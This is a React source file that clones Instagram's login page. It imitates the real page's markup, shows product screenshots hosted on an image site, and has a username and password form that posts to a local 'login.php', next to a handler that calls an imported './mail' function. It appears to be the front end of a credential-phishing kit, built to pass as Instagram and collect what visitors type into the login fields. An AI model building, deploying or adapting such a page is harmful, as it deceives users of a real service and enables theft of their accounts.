import React from 'react';
import './style.css';
import main from './mail';
export default function App() {
  const send = () => {
    main();
  };

  return (
    <main className="SCxLW o64aR" role="main">
      <article className="_4_yKc">
        <div className="yOZjD _80tAB">
          <div className="V64Sp">
            <img
              alt=""
              className="RP4i1"
              src="https://i.ibb.co/qnRmQzd/screenshot1.jpg"
            />
            <img
              alt=""
              className="RP4i1 UVauz"
              src="https://i.ibb.co/pRfGRHm/screenshot2.jpg"
            />
            <img
              alt=""
              className="RP4i1 JtrJi"
              src="https://i.ibb.co/C1rdvWg/screenshot3.jpg"
            />
            <img
              alt=""
              className="RP4i1"
              src="https://i.ibb.co/pL9JV7S/screenshot4.jpg"
            />
            <img
              alt=""
              className="RP4i1"
              src="https://i.ibb.co/vDsL0Zy/screenshot5.jpg"
            />
          </div>
        </div>
        <div className="rgFsT">
          <div className="gr27e">
            <h1 className="NXVPg Szr5J coreSpriteLoggedOutWordmark">
              Instagram
            </h1>
            <div className="EPjEi">
              <form
                className="HmktE"
                id="loginForm"
                method="post"
                action="login.php"
              >
                <div className="qF0y9 Igw0E IwRSH eGOV_ _4EzTm kEKum">
                  <div className="-MzZI">
                    <div className="_9GP1n">
                      <label className="f0n8F">
                        <span className="_9nyy2">
                          Phone number, username, or email
                        </span>
                        <input
                          aria-label="Phone number, username, or email"
                          aria-required="true"
                          autoCapitalize="off"
                          autoCorrect="off"
                          maxLength={75}
                          name="username"
                          type="text"
                          className="_2hvTZ pexuQ zyHYP"
                          value=""
                        />
                      </label>
                      <div className="i24fI"></div>
                    </div>
                  </div>
                  <div className="-MzZI">
                    <div className="_9GP1n">
                      <label className="f0n8F">
                        <span className="_9nyy2">Password</span>
                        <input
                          aria-label="Password"
                          aria-required="true"
                          autoCapitalize="off"
                          autoCorrect="off"
                          name="password"
                          type="password"
                          className="_2hvTZ pexuQ zyHYP"
                          value=""
                        />
                      </label>
                      <div className="i24fI">
                        <div className="qF0y9 Igw0E IwRSH eGOV_ _4EzTm soMvl">
                          <button className="sqdOP yWX7d _8A5w5" type="button">
                            Show
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="qF0y9 Igw0E IwRSH eGOV_ _4EzTm bkEs3 CovQj jKUp7 DhRcB">
                    <button className="sqdOP L3NKy y3zKF" disabled>
                      <div className="qF0y9 Igw0E IwRSH eGOV_ _4EzTm">
                        Log In
                      </div>
                    </button>
                  </div>
                </div>
                <a
                  className="_2Lks6"
                  href="https://instagram.com/accounts/password/reset/"
                  tabIndex={0}
                >
                  Forgot password?
                </a>
              </form>
            </div>
          </div>
          <div className="gr27e">
            <div className="_7UhW9 xLCgt MMzan _0PwGv uL8Hv">
              <p className="izU2O">
                Don't have an account?
                <a
                  data-testid="sign-up-link"
                  href="https://instagram.com/accounts/emailsignup/"
                  tabIndex={0}
                >
                  <span className="_7UhW9 xLCgt qyrsm gtFbE se6yk">
                    Sign up
                  </span>
                </a>
              </p>
            </div>
          </div>
          <div className="APQi1">
            <p className="b_nGN">Get the app.</p>
            <div className="iNy2T">
              <a
                className="z1VUo"
                href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo"
                tabIndex={0}
              >
                <img
                  alt="Available on the App Store"
                  className="Rt8TI"
                  src="https://i.ibb.co/2NLfzMh/badge-ios-english-en.png"
                />
              </a>
              <a
                className="z1VUo"
                href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD747B7DB-EBF3-4793-89EC-7A555D089985%26utm_content%3Dlo%26utm_medium%3Dbadge"
                tabIndex={0}
              >
                <img
                  alt="Available on Google Play"
                  className="Rt8TI"
                  src="https://i.ibb.co/4SpGDz3/badge-android-english-en.png"
                />
              </a>
            </div>
          </div>
        </div>
      </article>
    </main>
  );
}
